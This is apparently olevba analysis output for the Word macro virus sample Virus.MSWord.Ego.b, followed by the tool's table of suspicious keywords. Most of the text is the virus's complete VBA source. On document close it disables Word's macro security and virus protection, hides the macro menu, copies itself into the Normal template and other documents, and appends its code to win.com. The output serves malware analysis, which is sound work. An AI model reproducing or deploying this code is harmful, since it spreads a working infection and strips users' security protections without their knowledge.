olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ego.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ego.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO KRRPIPQP.bas 
in file: Virus.MSWord.Ego.b - OLE stream: 'Macros/VBA/KRRPIPQP'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'module
Dim osdir As String, casual As String, TheString As String, targdir As String, target As String
Private Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Private Declare Function GetVersionExA Lib "kernel32" (lpVersionInformation As OSVERSIONINFO) As Integer
Private Type OSVERSIONINFO
dwOSVersionInfoSize As Long: dwMajorVersion As Long: dwMinorVersion As Long: dwBuildNumber As Long: dwPlatformId As Long
szCSDVersion As String * 128
End Type
Sub AutoClose()
On Error Resume Next
Randomize
Dim sh As Integer, x As Integer, y As String
sh = (0 * Rnd)
Set myopt = Options: Set myap = Application: Set mys = System
mys.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
myopt.VirusProtection = sh: myopt.SaveNormalPrompt = sh
myap.EnableCancelKey = wCancelDisabled: myap.DisplayStatusBar = sh
myap.ScreenUpdating = sh: myap.DisplayAlerts = wdAlertsNone
myap.ScreenUpdating = sh
CommandBars("Tools").Controls("Macro").Delete
count = 10: While count > 2
x = Int((85 - 100 + 1) * Rnd + 85): y = Chr(x)
casual = casual + y: count = count - 1: Wend
Set AD = ActiveDocument.VBProject.VBComponents
Set NT = NormalTemplate.VBProject.VBComponents
osdir = GetWindows
Call getOS
target = osdir & targdir & "win.com"
Call Verify(target)
Ego = "'module"
For i = 1 To NT.count
If NT(i).CodeModule _
.lines(1, 1) = Ego Then NTOK = True
Next i
For i = 1 To AD.count
If AD(i).CodeModule _
.lines(1, 1) = Ego Then DocOK = True
Next i
If DocOK = True And NTOK = False Then
For i = 1 To NT.count
Nam = NT(i).Name
Next i
With myap.NormalTemplate.VBProject
             .VBComponents.Remove .VBComponents(Nam)
    End With
Call FindAtts(target)
NT.Add 1
NT(2).Name = (casual)
NT(casual).CodeModule.AddFromString (TheString)
End If
 If DocOK = False And NTOK = True Then
For i = 1 To AD.count
Nam = AD(i).Name
Next i
With myap.ActiveDocument.VBProject
            .VBComponents.Remove .VBComponents(Nam)
End With
Call FindAtts(target)
AD.Add 1
AD(2).Name = (casual)
AD(casual).CodeModule.AddFromString (TheString)
End If
End Sub
Public Function GetWindows() As String
Dim v As String: Dim y As Long
v = String$(144, 0): y = GetWindowsDirectory(v, Len(v))
If y = 0 Then
GetWindows = 0
Else
GetWindows = Left(v, y)
End If
End Function
Public Function Attach(D$)
Open D$ For Binary As 1
Seek #1, LOF(1) + 1
mystr$ = ThisDocument.VBProject.VBComponents(2).CodeModule.lines(1, 138)
Put #1, , Chr(42) + Chr(95) + Chr(95) + Chr(42) & mystr$ & Chr(42) + Chr(95) + Chr(95) + Chr(42)
Close
End Function
Public Function Verify(target As String)
Dim TheString As String: Dim f As Long
f = 1
Open target For Binary As #1
TheString = String$(LOF(1), 0)
Get #1, 1, TheString
s = InStr(f, TheString, (Chr(42) + Chr(95) + Chr(95) + Chr(42)))
Close #1
If s Then
Close
Else:
Call Attach(target)
End If
End Function
Public Function FindAtts(target As String)
Dim St, fi, Siz, f As Long
f = 1
Open target For Binary As #1
TheString = String$(LOF(1), 0)
Get #1, 1, TheString
s = InStr(f, TheString, (Chr(42) + Chr(95) + Chr(95) + Chr(42)))
f = InStr(s + 1, TheString, (Chr(42) + Chr(95) + Chr(95) + Chr(42)))
If s And f Then
St = s + 4: fi = f: Siz = f - (s + 4)
End If
leftPart$ = Left$(TheString, fi): rightpart$ = Mid$(TheString, St, Siz)
TheString = rightpart$
Close #1
End Function
Private Function getOS() As String
Dim osinfo As OSVERSIONINFO: Dim retvalue As Integer
osinfo.dwOSVersionInfoSize = 148: osinfo.szCSDVersion = Space$(128)
retvalue = GetVersionExA(osinfo)
With osinfo
Select Case .dwPlatformId
Case 1
If .dwMinorVersion = 0 Then
targdir = "\"
ElseIf .dwMinorVersion = 10 Then
targdir = "\"
End If
Case 2
If .dwMajorVersion = 3 Then
targdir = "\system32\"
ElseIf .dwMajorVersion = 4 Then
targdir = "\system32\"
ElseIf .dwMajorVersion = 5 Then
targdir = "\system32\"
End If
End Select
End With
End Function
' d. to Camilla v. beta1 (c) xvP 10.00
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

